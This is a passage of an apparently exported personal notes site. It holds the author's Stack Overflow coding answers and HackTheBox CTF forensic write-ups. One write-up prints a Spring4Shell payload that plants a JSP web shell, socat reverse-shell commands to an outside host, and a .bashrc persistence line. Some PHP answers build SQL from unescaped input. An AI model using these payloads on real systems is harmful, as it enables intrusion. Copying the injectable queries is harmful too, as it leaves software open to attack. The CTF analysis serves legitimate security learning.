\"Q2FrZQ%3D%3D.5exP\",\n    \"CakeCookie[alternate_language_suggestion]\": \"Q2FrZQ%3D%3D.9PBdWA%3D%3D\",\n}\n\nheaders = {\n    \"accept\": \"*/*\",\n    \"accept-encoding\": \"gzip, deflate, br\",\n    \"accept-language\": \"en-US,en;q=0.9\",\n    \"cache-control\": \"no-cache\",\n    \"content-length\": \"30\",\n    \"content-type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\n    \"cookie\": \"CAKEPHP=c79f210mdl6n2jpp962g9vjk9f; CookieConsent={stamp:'6CPboWb+OVPYxb8oz6CfbjxqXJzoYqXEDiPE62FxLheS24AUkkmksA==',necessary:true,preferences:true,statistics:true,marketing:true,ver:2,utc:1654956041620,region:'us'}; CakeCookie[lang]=Q2FrZQ==.5exP; CakeCookie[alternate_language_suggestion]=Q2FrZQ==.9PBdWA==\",\n    \"dnt\": \"1\",\n    \"origin\": \"https://10fastfingers.com\",\n    \"pragma\": \"no-cache\",\n    \"referer\": \"https://10fastfingers.com/typing-test/german\",\n    \"sec-fetch-dest\": \"empty\",\n    \"sec-fetch-mode\": \"cors\",\n    \"sec-fetch-site\": \"same-origin\",\n    \"sec-gpc\": \"1\",\n    \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36\",\n    \"x-requested-with\": \"XMLHttpRequest\",\n}\n\nresponse_object = requests.post(url, data=data, cookies=cookies, headers=headers)\nwords = response_object.text\nprint(words)\n```\n","n":0.097}}},{"i":45,"$":{"0":{"v":"Use `QApplication` in `PyQt5`","n":0.5},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72585326/6456163) for the original answer.\n\nFor anyone experiencing this issue in PyQt5, try using `QCoreApplication` instead and it should work.\n","n":0.218}}},{"i":46,"$":{"0":{"v":"Access the `location` prop in Gatsby","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72393968/6456163) for the original answer.\n\nYou should have the `location` variable already defined, it is likely in the global scope so you don't need to pass it as a parameter to the function. Try just using the variable and see if that works.\n","n":0.151}}},{"i":47,"$":{"0":{"v":"Get the pressed key in JavaScript","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72393858/6456163) for the original answer.\n\nOne way to do this that's even shorter than the other answers:\n\n```js\ndocument.onkeydown = (e) => console.log(e.key);\n```\n\nThis uses an inline function to further reduce the length of the answer by [zer00ne](https://stackoverflow.com/a/72393774/6456163).\n\nIf you are more interested in form validation than just logging to the console, you can also do something along the lines of the following:\n\n```js\nfunction alphaOnly(event) {\n  let key = event.keyCode;\n  return ((key >= 65 && key <= 90) || key == 8);\n};\n```\n","n":0.113}}},{"i":48,"$":{"0":{"v":"Javascript - How to select \"x\" row","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72393715/6456163) for the original answer.\n\nOne answer to this question can be found [here](https://stackoverflow.com/a/11365819/6456163), if you are only interested in getting the `nth` row of a table via JavaScript:\n\n```js\nvar cells = document.getElementById('table').getElementsByTagName('td');\n```\n\nThis will contain all your table cells. Use array notation to access a specific one:\n\n```js\ncells[4]\n```\n\nHere's a quick demo which changes the background color:\n\nhttp://jsfiddle.net/jackwanders/W7RAu/\n","n":0.135}}},{"i":49,"$":{"0":{"v":"How to get a Value from NodeList?","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72393517/6456163) for the original answer.\n\nOne way to access the items returned from `getElementsByNodeName` is from [W3 Schools](https://www.w3schools.com/jsref/met_doc_getelementsbyname.asp):\n\n```js\nconst collection = document.getElementsByName(\"phone\");\nfor (let i = 0; i < collection.length; i++) {\n  let valueYouAreInterestedIn = collection[i].specialKeyYouWant;\n  // Use the value below :)\n}\n```\n\nPlease comment if there is anything else you need help with!\n","n":0.14}}},{"i":50,"$":{"0":{"v":"Creating HTML/Javascript Modal with dynamic text","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72393463/6456163) for the original answer.\n\nThe problem with your code is that you are attempting to access the entirety of the `querySelectorAll` array instead of the individual element that you are interested in. See the code below for an example of a way to resolve this:\n\n```js\nfor (let i = 0; i < btnsOpenModal.length; i++) {\n  btnsOpenModal[i].addEventListener(\"click\", function () {\n    const modalText = btnsOpenModal[i].id;\n\n    if (text[i].classList.contains(modalText)) {\n      text[i].classList.remove(\"hidden\");\n    }\n\n    modal.classList.remove(\"hidden\");\n    overlay.classList.remove(\"hidden\");\n  });\n}\n```\n","n":0.118}}},{"i":51,"$":{"0":{"v":"Regex for capturing all the urls in a paragraph except for a specific domain","n":0.267},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72392318/6456163) for the original answer.\n\nThis should be sufficient for your use case:\n\n```regex\n/(?<!\\S)(?:https?:\\/\\/)?(?:(?:(?!example)\\w+[.-])+[a-z]{2,11})(?!\\S)/gi\n```\n\nSee [here](https://regex101.com/r/NdOxKt/1) for a demonstration of the regex at work. Below is a rough explanation of what the regex is doing:\n\n- The leading and trailing `(?<!\\S)` essentially splits the string into segments on space characters, including whitespace and newlines\n- The `?:` syntax makes each set of parenthesis it is in a non-capture group, saving memory on the machine where it is ran and speeding up your execution time\n- `(?:https?:\\/\\/)?` optionally matches both `http` and `https` for URLs without matching the invalid characters `:` and `/` anywhere else in the URL\n- `(?:(?!example)\\w+[.-])+` looks for one or more words that do not match `example`, followed by either a hyphen or a period\n- `[a-z]{2,11}` matches the final domain extension, i.e. `com`, `org`, or `enterprises`\n","n":0.086}}},{"i":52,"$":{"0":{"v":"Will user update or overwriting file before other session done in PHP?","n":0.289},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72392166/6456163) for the original answer.\n\nPHP is synchronous unless you specify otherwise, so any write operations *should* be queued and prevent the vast majority of write conflicts. To be extra safe, I am copying an answer [\\[link\\]](https://stackoverflow.com/a/24080883/6456163) that explains how to do so below:\n\n---\n\nFile access is simultaneous but you can use [`flock`](http://php.net/flock) to block other handles from accessing the file while you perform your read/write operations. It sounds like the best solution to your problem would be to use PDO and [SQLite](http://php.net/manual/en/book.sqlite.php) (if available). This way you have the database handle all locking for you but do not need a dedicated database server. SQLite is entirely file based.\n\nIf SQLite is not available, you'll want to make use of flock's `LOCK_EX` operation, this will only allow one write stream to access the file at a time, e.g.\n\n```php\n// create the file handle\n$hnd = fopen($destpath, 'ab+');\n\nif ($isReadOperation) {\n    // shared lock - simultaneous reads can happen at one time\n    flock($hnd, LOCK_SH);\n\n    // perform your read operation\n} else {\n    // exclusive lock - only one write can occur at a time after all shared locks are released\n    flock($hnd, LOCK_EX);\n\n    // perform your read/write operation\n}\n\n// release the lock\nflock($hnd, LOCK_UN);\n\n// release the file handle\nfclose($hnd);\n```\n","n":0.071}}},{"i":53,"$":{"0":{"v":"Pixelated resize using canvas with transparent PNG","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/71229461/6456163) for the original answer.\n\nThis has since been made into an extremely minimalist library, and my PR for PNG support can be found [here](https://github.com/rogeriopvl/8bit/pull/6).\n\nOnce it has been merged I will come back and update this answer.\n\nThe full code, generalized and simplified from @Blindman67's answer:\n\n```javascript\n/**\n * 8bit\n *\n * A module that converts an image into a pixelated version (just like\n * 8bit artwork).\n *\n * @author rogeriopvl <https://github.com/rogeriopvl>\n * @license MIT\n */\n\n(function (root, factory) {\n  if (typeof define === \"function\" && define.amd) {\n    define([], factory);\n  } else if (typeof exports === \"object\") {\n    module.exports = factory();\n  } else {\n    root.eightBit = factory();\n  }\n} (this, function () {\n  // Necessary to hide the original image with PNG transparency\n  const invisibleCanvas = document.createElement(\"canvas\");\n  const invisibleCtx = invisibleCanvas.getContext(\"2d\");\n\n  /**\n   * Draws a pixelated version of an image in a given canvas.\n   * @param {object} canvas - a canvas object\n   * @param {object} image - an image HTMLElement object\n   * @param {number} quality - the new quality: between 0 and 100\n   */\n  const eightBit = function (canvas, image, quality) {\n    quality /= 100;\n\n    canvas.width = invisibleCanvas.width = image.width;\n    canvas.height = invisibleCanvas.height = image.height;\n\n    const scaledW = canvas.width * quality;\n    const scaledH = canvas.height * quality;\n    const ctx = canvas.getContext(\"2d\");\n\n    ctx.mozImageSmoothingEnabled = false;\n    ctx.webkitImageSmoothingEnabled = false;\n    ctx.imageSmoothingEnabled = false;\n\n    // Draws image scaled to desired quality on the invisible canvas, then\n    // draws that scaled image on the visible canvas.\n    ctx.clearRect(0, 0, canvas.width, canvas.height);\n    invisibleCtx.clearRect(0, 0, invisibleCtx.canvas.width, invisibleCtx.canvas.height);\n    invisibleCtx.drawImage(image, 0, 0, scaledW, scaledH);\n    ctx.drawImage(invisibleCtx.canvas, 0, 0, scaledW, scaledH, 0, 0, canvas.width, canvas.height);\n  };\n\n  return eightBit;\n}));\n```\n","n":0.062}}},{"i":54,"$":{"0":{"v":"Cannot run Jest tests for components (Failed to load html files)","n":0.302},"1":{"v":"\n> See [here](https://stackoverflow.com/a/71191077/6456163) for the original answer.\n\n[This answer](https://stackoverflow.com/a/41558029/6456163) helped me to solve this problem. As link-only answers are discouraged, below I have included the original answer by [bnjmnhndrsn](https://stackoverflow.com/users/3712767/bnjmnhndrsn).\n\nI encountered this specific problem recently and creating your own transform preprocesser will solve it. This was my set up:\n\n**package.json**\n\n```json\n\"jest\": {\n  \"moduleFileExtensions\": [\n    \"js\",\n    \"html\"\n  ],\n  \"transform\": {\n    \"^.+\\\\.js$\": \"babel-jest\",\n    \"^.+\\\\.html$\": \"<rootDir>/test/utils/htmlLoader.js\"\n  }\n}\n```\n\nNOTE: babel-jest is normally included by default, but if you specify a custom transform preprocessor, you seem to have to include it manually.\n\n**test/utils/htmlLoader.js:**\n\n```javascript\nconst htmlLoader = require(\"html-loader\");\n\nmodule.exports = {\n  process(src, filename, config, options) {\n    return htmlLoader(src);\n  }\n}\n```\n","n":0.103}}},{"i":55,"$":{"0":{"v":"How to add or remove a className when screen size change in react","n":0.277},"1":{"v":"\n> See [here](https://stackoverflow.com/a/63860125/6456163) for the original answer.\n\nIf you're looking to do this with hooks instead of classes, here is a simple example for this case:\n\n```js\nconst [isMobile, setIsMobile] = useState(window.innerWidth < 1200);\n\n{/* Performs similarly to componentDidMount in classes */}\nuseEffect(() => {\n    window.addEventListener(\"resize\", () => {\n        const ismobile = window.innerWidth < 1200;\n        if (ismobile !== isMobile) setIsMobile(ismobile);\n    }, false);\n}, [isMobile]);\n\n{/* There is no need for a render function with Hooks */}\nreturn (\n    <p className={`${isMobile ? \"mobile-class\" : \"non-mobile-class\"}`}>Your text here</p>\n);\n```\n\nFor a more in-depth explanation of the useEffect hook, check out the official React documentation [here](https://reactjs.org/docs/hooks-state.html). Please note that you must be using React 16.8 or higher to take advantage of hooks.\n","n":0.096}}},{"i":56,"$":{"0":{"v":"How to show the last uploaded image when refresh page in PHP","n":0.289},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57730165/6456163) for the original answer.\n\nThis can be solved by adding random parameters to the image src, as shown [here](https://stackoverflow.com/a/729623/6456163). For example, turn this:\n\n```html\n<img src=\"image.png\" />\n```\n\nInto this:\n\n```html\n<img src=\"image.jpg?1222259157.415\">\n```\n\nIn the second src, the numbers after the question mark are the current timestamp. This is demonstrated in [this](https://stackoverflow.com/a/6116854/6456163) answer, which sets the timestamp in JavaScript and appends it to the src using `Date.now()`.\n","n":0.127}}},{"i":57,"$":{"0":{"v":"Failed to load resource: Preflight response is not successful","n":0.333},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57728999/6456163) for the original answer.\n\nIf you're still experiencing this issue, it appears to have been solved [here](https://github.com/ionic-team/cordova-plugin-ionic-webview/issues/70). The recommended solutions were:\n\n- Implementing CORS server-side\n- Using [Cordova native http plugin](https://github.com/silkimen/cordova-plugin-advanced-http)\n","n":0.18}}},{"i":58,"$":{"0":{"v":"Adding elements to an object in a loop","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57680411/6456163) for the original answer.\n\nWhat I would suggest is an array filled with objects. What you are trying to do right now is not valid. Here's an example of the proper formatting:\n\n```js\n[\n  { name: 'test1', id: 1 },\n  { name: 'test2', id: 2 },\n]\n```\n\nThis is how I would refactor your code:\n\n```js\nlet data = [];\nconst res = JSON.parse(body);\n\nfor (let i = 0; i < res.teams.length; i++) {\n  data.push({ name: res.teams[i].name, id: res.teams[i].id });\n}\nconsole.log(data);\n```\n\nThis way you will have to loop over the array to access each object, such as getting `{ name: 'test1', id: 1 }` by accessing `data[0]`.\n","n":0.101}}},{"i":59,"$":{"0":{"v":"Get `nth` word of URL parameter in PHP","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57680284/6456163) for the original answer.\n\nTo break the string at a space, you would use the explode function. That separates the parameter and breaks it into an array, so to get the first word you just need to get the 0th index:\n\n```php\n$fullname = explode(\" \", $_GET[\"name\"])[0];\n```\n\nIf space in your URL is encoded as in your example, you just need to replace the space with the encoding:\n\n```php\n$fullname = explode(\"%20\", $_GET[\"name\"])[0];\n```\n\n**Edit**: As pointed out in the comments, the first method should be the way to go because your method of getting the parameter automatically decodes the URL.\n","n":0.102}}},{"i":60,"$":{"0":{"v":"Test numerical range with Jasmine","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57675174/6456163) for the original answer.\n\nDepending on how specific you need it to be, you could create a range of +-1 second or some similar number with `toBeWithinRange` from the [Jasmine Matchers](https://www.npmjs.com/package/jasmine-expect) package:\n\n```js\nexpect(createdTime).toBeWithinRange(Date.now() - 1000, Date.now() + 1000)\n```\n\nWith this method you will have to test the `createdTime` separately from the other test, but that shouldn't be too big of an issue. You just need to assign the return property that you want to the variable `createdTime`.\n\n**Edit**- A similar method with a more clear matcher is using `toBeNear`:\n\n```js\nexpect(createdTime).toBeNear(Date.now(), 2);\n```\n\nThis will be true if the date assigned to createdTime is within two seconds of the date when the test runs.\n\n**Edit 2**- to exclude object keys when testing, you can follow an example [here](https://stackoverflow.com/a/24487384/6456163). This is how you would do it in your case:\n\n```js\nvar joc = jasmine.objectContaining;\nexpect(fun(\"abc\", 1))\n.toEqual(joc({\n  name: \"abc\",\n  id: 1\n}));\n```\n","n":0.085}}},{"i":61,"$":{"0":{"v":"Error handling in Express.js","n":0.5},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57674854/6456163) for the original answer.\n\n[This page](https://expressjs.com/en/guide/error-handling.html) describing basic error handling in Express might be helpful to you. It's hard to give any more specific information because we do not know what type of errors you anticipate getting.\n\nIf you mean specifically with `createReadStream`, the methods discussed [here](https://github.com/adaltas/node-csv/issues/155#issuecomment-36191678) might be helpful to you:\n\n```js\nreadStream = filesys.createReadStream(\n  path.join(__dirname, \"static\", \"post_request.html\")\n);\nreadStream.on(\"error\", function() { /*handle error*/ });\nres.writeHead(200, { \"Content-type\": \"text/html\" });\nreadStream.pipe(res);\n```\n","n":0.122}}},{"i":62,"$":{"0":{"v":"Rewrite URL parameters with htaccess","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57667261/6456163) for the original answer.\n\nHere's a copy of my answer to a [similar question](https://stackoverflow.com/a/57666990/6456163). Hopefully it'll help you:\n\n[This](https://grokbase.com/t/php/php-general/0159ts8x8h/passing-parameters-in-the-url-using-forward-slashes#20010509ss83mvqx7894e90njxvrsjgkcg) page appears to have a solution to what you are trying to do:\n\n```php\n<?\n    $Params = explode( '/', $PATH_INFO );\n\n    while( list( $Index, $Value ) = each( $Params )) {\n        echo \"Params[ $Index ] = $Value<BR>\\n\";\n    }\n?>\n```\n\n\n> Hit this URL:\n\n> http://whatever.site.com/ThisIsAProgram/these/directories/are/not/real\n\n> You should get:\n\n> Params[ 0 ] =\n\n> Params[ 1 ] = these\n\n> Params[ 2 ] = directories\n\n> Params[ 3 ] = are\n\n> Params[ 4 ] = not\n\n> Params[ 5 ] = real\n\nAnd to display the PHP file as just the file name, try this:\n\n```text\nOptions +MultiViews\nRewriteEngine On\n\nRewriteCond %{THE_REQUEST} /([^.]+)\\.php [NC]\nRewriteRule ^ /%1 [NC,L,R]\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^ %{REQUEST_URI}.php [NC,L]\n```\n\n----------\n\nIf you are wanting a more **complete** example, [this answer](https://serverfault.com/a/210766) covers it a lot more in depth than I could. This will definitely help you cover all your bases and understand the issue if my other linked article doesn't make it clear enough.\n","n":0.079}}},{"i":63,"$":{"0":{"v":"Iterate over objects returned from Google Maps API","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57667164/6456163) for the original answer.\n\nkshetline answered your question the way you would interact with the JSON object in JavaScript, but since you never mentioned JavaScript and only have PHP in your question's tags I am going to try to answer you with PHP.\n\nTo access properties of a JSON object in PHP, you must use the [arrow syntax](https://www.w3schools.com/js/js_json_php.asp):\n\n```php\n$result = $djd->results;\nfor($i=0; $i<5; $i++){\n    // Do what you want with them from here\n    $lat = $result[$i]->geometry->location->lat;\n    $lng = $result[$i]->geometry->location->lng;\n\n    // Example of how to return them\n    echo json_encode($lat);\n    echo json_encode($lng);\n}\n```\n\nI do not know what the JSON returned looks like, so I based my PHP off of the JSON in kshetline's answer. I'm sure their JSON is correct, so this should work.\n","n":0.091}}},{"i":64,"$":{"0":{"v":"Format dynamic URL to be SEO friendly with htaccess and PHP","n":0.302},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57666990/6456163) for the original answer.\n\n[This](https://grokbase.com/t/php/php-general/0159ts8x8h/passing-parameters-in-the-url-using-forward-slashes#20010509ss83mvqx7894e90njxvrsjgkcg) page appears to have a solution to what you are trying to do:\n\n```php\n<?\n    $Params = explode( '/', $PATH_INFO );\n\n    while( list( $Index, $Value ) = each( $Params )) {\n        echo \"Params[ $Index ] = $Value<BR>\\n\";\n    }\n?>\n```\n\n\n> Hit this URL:\n\n> http://whatever.site.com/ThisIsAProgram/these/directories/are/not/real\n\n> You should get:\n\n> Params[ 0 ] =\n\n> Params[ 1 ] = these\n\n> Params[ 2 ] = directories\n\n> Params[ 3 ] = are\n\n> Params[ 4 ] = not\n\n> Params[ 5 ] = real\n\nAnd to display the PHP file as just the file name, try this:\n\n```text\nOptions +MultiViews\nRewriteEngine On\n\nRewriteCond %{THE_REQUEST} /([^.]+)\\.php [NC]\nRewriteRule ^ /%1 [NC,L,R]\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^ %{REQUEST_URI}.php [NC,L]\n```\n\n----------\n\n**EDIT**: If you are wanting a more complete example, [this answer](https://serverfault.com/a/210766) covers it a lot more in depth than I could. This will definitely help you cover all your bases and understand the issue if my other linked article doesn't make it clear enough.\n","n":0.082}}},{"i":65,"$":{"0":{"v":"Join PHP variable with string","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57666910/6456163) for the original answer.\n\nI was in the process of writing this and saw Tim's comment, which is exactly what I was going to say. It seems much easier to add the string \"TEXT\" to the information you want in the PHP instead of the SQL. Here is an example:\n\n```php\necho \"TEXT\" . $valueAA . $valueAVAR;\n```\n","n":0.132}}},{"i":66,"$":{"0":{"v":"Show `n` columns side-by-side with CSS","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57434450/6456163) for the original answer.\n\nI fixed this [here](https://jsfiddle.net/ajmeese7/k5o60dwy/5/). The problem was the flex was overriding the default width.\n\nThis is what the CSS is now:\n\n```css\n.col-md-4 {\n  flex: none;\n  max-width: 33.3333333333%;\n  width: 20%;\n}\n```\n\nIt successfully sets the width of the columns to 20% instead of 33.3%.\n","n":0.149}}},{"i":67,"$":{"0":{"v":"Connect to CodeIgniter database from PHP","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57432006/6456163) for the original answer.\n\nThis might work instead:\n\n```php\n$sql = \"SELECT * FROM utilizadores WHERE username = '$username' AND password='$password'\";\n$result = $conn->query($sql) or die($conn->error);\n\nif ($result->num_rows > 0) {\n  // return array\n} else {\n  return false;\n}\n```\n\nThis is similar to what I use with the mysqli library, but I don't know if it is something you are willing to incorporate into your project. It is a breeze to work with.\n\nAlso, it seems your method may be storing the passwords in cleartext, which is not a good idea.\n\n**EDIT**- This is how I create my connection:\n\n```php\n$servername = \"\";\n$username = \"\";\n$password = \"\";\n$dbname = \"\";\n\n// Create connection\n$conn = new mysqli($servername, $username, $password, $dbname);\n// Check connection\nif ($conn->connect_error) {\n  die(\"Connection failed: \" . $conn->connect_error);\n}\n```\n\n**EDIT #2**: The issue was using double quotes instead of single quotes. Please, nobody else fall into this demonic trap.\n","n":0.085}}},{"i":68,"$":{"0":{"v":"Query rows from a database table in PHP","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/57394863/6456163) for the original answer.\n\nYou are never using `$condition1` and `$condition2` after you give them their static values, which might be the problem here.\n\nAnother thing I would consider is switching from your current `$result` assignment to this:\n\n```php\n$sql = \"SELECT * FROM client_scope WHERE client_scope_id = '$siteID'\n        AND client_Id='\".$_SESSION['clientId'].\"'\";\n$result = $conn->query($sql) or die($conn->error);\n```\n\nIn your current query, you didn't include single quotes around `$siteId`, which was likely one of the problems because I had the same issue with a query yesterday.\n\nAnother problem was you had a set of single quotes inside another set of single quotes with your `client_Id` assignment, which doesn't work. Using the period operator, this method joins the `$_SESSION` part of the query with the rest. This is explained [here](https://stackoverflow.com/a/3383845/6456163).\n\nFinally, the `or die($conn->error)` part of `$result` typically shows you errors that may exist like this in your queries in the future. For an explanation of this, see [here](https://stackoverflow.com/a/35669638).\n\nThis may be a personal preference, but I have always seen your foreach loop written as something similar to this:\n\n```php\nwhile ($row = $result->fetch_assoc()) {\n  echo json_encode($row);\n}\n```\n\nI don't know if there is any functional difference, but it may be another factor.\n","n":0.073}}},{"i":69,"$":{"0":{"v":"Apply CSS class to focused element with jQuery","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/45668338/6456163) for the original answer.\n\nYou just have to add separate ID's to access the different fields:\n\n```html\n<span class=\"fakeplaceholder\" id=\"first\">First Name</span>\n<span class=\"fakeplaceholder\" id=\"last\">Last Name</span>\n```\n\nThen apply the `fakeplaceholdertop` class to the specific element:\n\n```js\n$(\".firstname\").focus(function() {\n    $(\"#first\").addClass(\"fakeplaceholdertop\");\n});\n\n$(\".lastname\").focus(function() {\n    $(\"#last\").addClass(\"fakeplaceholdertop\");\n});\n```\n","n":0.167}}},{"i":70,"$":{"0":{"v":"Medium Articles","n":0.707}}},{"i":71,"$":{"0":{"v":"HackTheBox","n":1}}},{"i":72,"$":{"0":{"v":"Hack The Boo 2022","n":0.5}}},{"i":73,"$":{"0":{"v":"Wrong Spooky Season","n":0.577},"1":{"v":"\n- Looking for XSS:\n\n  ```text\n  http.content_type == \"application/x-www-form-urlencoded\"\n  ```\n\n  Returned 3 packets: 335, 353, and 387.\n\n  Packet #353 is the most interesting, it has a data length of 775:\n\n  ```text\n  class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n  ```\n\n- Ran lots of requests with Python:\n\n  ```text\n  http.user_agent == \"python-requests/2.28.1\"\n  ```\n\n- The `.jsp` file is a reverse shell:\n\n  ```text\n  http.request.uri contains \".jsp\"\n  ```\n\n- Command execution in packet 416 via JSP:\n\n  ```text\n  http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=whoami\n  ```\n\n  Returned that the user is `root` in packet 418.\n\n  Confirmed additionally in #426/428, which executed and got the response of `id`.\n\n- Installed `socat` on the machine in packet 436:\n\n  ```text\n  http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=apt%20-y%20install%20socat\n  ```\n\n  Confirmed successful in packet 456.\n\n- Ran `socat` in packet 464:\n\n  ```text\n  http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash\n  ```\n\n- Following the TCP packets after 464, the commands were:\n  - `id`: `uid=0(root) gid=0(root) groups=0(root)`\n  - `groups`: `root`\n  - `uname -r`: `5.18.0-kali7-amd64`\n  - `cat /etc/passwd`:\n\n    ```log\n    root:x:0:0:root:/root:/bin/bash\n    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n    bin:x:2:2:bin:/bin:/usr/sbin/nologin\n    sys:x:3:3:sys:/dev:/usr/sbin/nologin\n    sync:x:4:65534:sync:/bin:/bin/sync\n    games:x:5:60:games:/usr/games:/usr/sbin/nologin\n    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n    messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n    ```\n  - `find / -perm -u=s -type f 2>/dev/null`:\n\n    ```log\n    /bin/su\n    /bin/umount\n    /bin/mount\n    /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n    /usr/lib/openssh/ssh-keysign\n    /usr/bin/newgrp\n    /usr/bin/chfn\n    /usr/bin/gpasswd\n    /usr/bin/passwd\n    /usr/bin/chsh\n    ```\n  - `echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo \"==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS\" | rev > /dev/null && chmod +s /bin/bash`\n  - `ls -lh`:\n\n    ```log\n    total 20K\n    drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .\n    drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..\n    -rwxrwx--- 1 root root 1.8K Oct  8 00:04 pom.xml\n    drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src\n    drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target\n    ```\n\nThe flag is the reversed base64 string decoded:\n\n```text\nHTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}\n```\n","n":0.062}}},{"i":74,"$":{"0":{"v":"Trick Or Breach","n":0.577},"1":{"v":"\n```shell\n# Extract the DNS query data from the pcap;\n# https://unix.stackexchange.com/a/393503/370076\ntshark -r ./capture.pcap -T fields -e dns.qry.name -Y 'dns.flags.response == 0' > raw_exfil.txt\n\n# Get only the data from the DNS queries;\n# https://www.hackucf.org/hack-all-the-things/hack-all-the-things-exfiltrating-data-via-dns-requests\negrep -o \"[0-9a-f]+.pumpkincorp.com\" ./raw_exfil.txt | cut -d. -f1 > exfil.txt\n\n# Unhex the exfiltrated data\nxxd -r -p < exfil.txt > data\n```\n\nLooking at the `data` file, I determined that it was an archive that was really an Excel spreadsheet. I opened it in OpenOffice and found the flag:\n\n```text\nHTB{M4g1c_c4nn0t_pr3v3nt_d4t4_br34ch}\n```\n","n":0.115}}},{"i":75,"$":{"0":{"v":"Pumpkin Stand","n":0.707},"1":{"v":"\n## Target Information\n\n- IP: `167.71.135.137:32184`\n-  Nothing related to the challenge is running on any other ports:\n    ```shell\n    $ nmap 167.71.135.137 -sC -sV -T4 -Pn\n    ```\n- SSH'ing into the target just runs the binary, it doesn't give a version or anything:\n    ```shell\n    $ ssh -p 32184 anonymous@167.71.135.137\n    ```\n\n## Exploitation\n\n- Tried going into the negative numbers to overflow back to positive, which worked, but it failed when attempting to purchase the laser.\n\n  The overflow happens right above the 32000 mark, which you can get right on the edge of with 24 shovel purchases.\n\n- Figured out that using `telnet 167.71.135.137 32184` connects me to the server and runs the binary there.\n\n  Running anything with letters crashes the program into an endless loop of \"You cannot buy less than 1!\"\n\n  Running the command in a non-PTY terminal allowed me to use the escape command, which is `^]`. That got me to the telnet prompt, which allowed me to run commands. The `help` command showed me everything I have access to, which is very little.\n\n- Entering `-2` then `-11` a few times got me to the overflow, which allowed me to buy the laser and returned the flag:\n\n  ```text\n  HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}\n  ```\n","n":0.071}}},{"i":76,"$":{"0":{"v":"Ouija","n":1},"1":{"v":"\n> You've made contact with a spirit from beyond the grave! Unfortunately, they speak in an ancient tongue of flags, so you can't understand a word. You've enlisted a medium who can translate it, but they like to take their time...\n\n## Exploitation\n\nExecuting the binary takes a long time and outputs the following:\n\n```log\n$ ./ouija\nRetrieving key.\n     ..... done!\nHmm, I don't like that one. Let's pick a new one.\n     ..... done!\nYes, 18 will do nicely.\n     ..... done!\nLet's get ready to start. This might take a while!\n     ..... done!\nThis one's an uppercase letter!\n     ..... done!\nOkay, let's write down this letter! This is a pretty complex operation, you might want to check back later.\n     ..... 